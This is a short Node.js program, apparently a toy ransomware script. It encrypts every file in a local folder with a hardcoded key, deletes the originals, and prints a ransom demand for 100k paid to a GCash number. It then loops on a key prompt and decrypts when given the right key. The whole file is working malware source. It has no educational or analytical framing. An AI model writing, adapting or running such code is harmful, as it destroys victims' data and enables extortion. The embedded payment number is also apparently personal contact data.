var encryptor = require('file-encryptor');
var readlineSync = require('readline-sync');
var fs = require('fs');

var encryptionKey = 'IamBrokeGuy100k';
var secretfiles = './secretfiles';

fs.readdirSync(secretfiles).forEach(file => {
    encryptor.encryptFile(`${secretfiles}/${file}`, `${secretfiles}/${file}.encrypt`, encryptionKey, function(err) {
        fs.unlinkSync(`${secretfiles}/${file}`);
        console.log(`Your files have been encrypted if you want to decrypt them send to me a 100k $ to my gcash account 09674385665 
        and i will give you the decryption key send to my email address the proven that you successfully paid the amount`);
        
        var decryptionKey;
        var decryptedFileName;
        var decryptionSuccessful = false;

        while (!decryptionSuccessful) {
            decryptionKey = readlineSync.question('Please enter the decryption key (type "exit" to quit): ');

            if (decryptionKey.toLowerCase() == 'exit') {
                console.log('Exiting decryption process.');
                return;
            }

            if (decryptionKey === encryptionKey) {
                decryptionSuccessful = true;
                decryptedFileName = `${secretfiles}/${file}.encrypt`.replace('.encrypt', '');
            } else {
                console.log('Incorrect decryption key. Please try again or type "exit" to quit.');
            }
        }
            encryptor.decryptFile(`${secretfiles}/${file}.encrypt`, decryptedFileName, decryptionKey, function(err) {
            console.log(`Congratulations, your files have been decrypted.`);
            fs.unlinkSync(`${secretfiles}/${file}.encrypt`);
        });
    });
});